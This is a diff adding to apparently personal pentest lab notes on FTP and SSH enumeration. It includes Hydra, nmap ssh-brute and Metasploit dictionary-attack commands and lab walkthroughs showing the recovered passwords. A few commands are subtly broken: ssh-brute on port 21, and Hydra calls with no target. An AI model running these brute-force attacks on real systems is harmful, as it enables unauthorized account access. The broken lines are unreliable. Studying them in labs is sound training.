@@ -774,7 +774,7 @@ msf5 auxiliary > set RHOSTS [TARGET]
 msf5 auxiliary > set pass_file /path/to/wordlists
 msf5 auxiliary > set smbuser [USER]
 $ gzip -d /usr/share/wordlists/rockyou.txt.gz # RockYou on Kali.
-$ hydra -l [USER] -P /usr/share/wordlists/rockyou.txt [TARGET] [PROTOCOL] # In this case it'd be smb.m
+$ hydra -l [USER] -P /usr/share/wordlists/rockyou.txt [TARGET] [PROTOCOL] # In this case it'd be smb.
 msf5 > use auxiliary/scanner/smb/pipe-auditor
 msf5 auxiliary > set smbuser [USER]
 msf5 auxiliary > set smbpass [PASSWORD]
@@ -831,3 +831,102 @@ $ tar xfv flag.tar.gz
 ```
 
 And we're good to go.
+
+## FTP service enumeration
+
+```bash
+$ nmap -sV -A -p21 [TARGET]
+$ ftp [TARGET]
+$ hydra -L /path/to/users -P /path/to/passwords [TARGET] [SERVICE]
+$ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords [TARGET] ftp
+$ nmap --script ftp-brute --script-args userdb=/path/to/users -p21 [TARGEt]
+```
+
+### ProFTP Recon: Basics lab 
+
+Objective: get the password for the auditor user and the flag!
+
+```bash
+$ ping $target
+$ nmap -sV -A $target
+21/tcp open  ftp     ProFTPD 1.3.5a
+$ ftp $target
+# We don't have a password, and the FTP server doesn't 
+# let us use an anonymous account. Let's get some cr3ds!!!
+$ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $target ftp
+# WE GOT A HIT!!!
+[21][ftp] host: .3   login: auditor   password: p4ssw0rd
+$ ftp $target
+ftp > ls
+secret.txt
+ftp > get secret.txt
+# Lesgooooo!
+```
+
+## VSFTPD Recon: Basics
+
+```bash
+$ nmap -sV -A --script ftp-anon
+```
+
+### VSFTPD Recon: Basics Lab
+
+Objective: get the flag, although we don't have a user or password...
+
+```bash
+$ nmap $target
+21/tcp open  ftp
+$ nmap -sV -A -p21 $target
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
+|_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
+$ ftp $target
+# We log in with the anonymous user...
+ftp > ls
+-rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
+ftp > get flag
+# Good to go...
+```
+
+## SSH Recon
+
+## SSH Recon: Basics
+
+| Script            | Function                                     | Args                                      |
+|------------------ | -------------------------------------------- | ----------------------------------------- |
+| ssh2-enum-algos   | Enumerates accepted encryption algorithms.   | None                                      |
+| ssh2-hostkey      | Shows SSH keys.                              | ssh-hostkey.known-hosts-path, ssh-hostkey |
+| ssh-auth-methods  | Returns authentication methods.              | ssh.user                                  |
+| ssh-brute         | Bruteforce SSH                               | userdb, passdb, ssh-brute.timeout, etc    |
+
+Note to self: look for noauth methods.
+
+## SSH Dictionary Attacks
+
+```bash
+$ hydra -L /path/to/users -P /path/to/passwords [TARGET] ssh
+$ nmap [TARGET] --script ssh-brute --script-args userdb=/path/to/users passdb=/path/to/passwords
+msf > use auxiliary/scanner/ssh/ssh_login
+msf auxiliary > set RHOSTS [TARGET]
+msf auxiliary > set USERPASS_FILE /path/to/users
+msf auxiliary > run
+```
+
+## SSH Dictionary Attacks: Lab
+
+Objective: find the "student" password with Hydra, the administrator with nmap and root with msfconsole.
+
+```bash
+$ echo student > student; echo administrator > administrator; echo root > root
+$ hydra -L ./student -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+# We get a hit on the password: "enemy"
+$ nmap -p21 --script ssh-brute --script-args userdb=/root/administrator
+# Password is "moonlight".
+$ msfconsole
+msf > use auxiliary/scanner/ssh/ssh_login
+msf auxiliary > set RHOSTS $target
+msf auxiliary > set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
+msf auxiliary > run
+# If a hit is given, an SSH session will be opened. It's terrible, though. 
+```
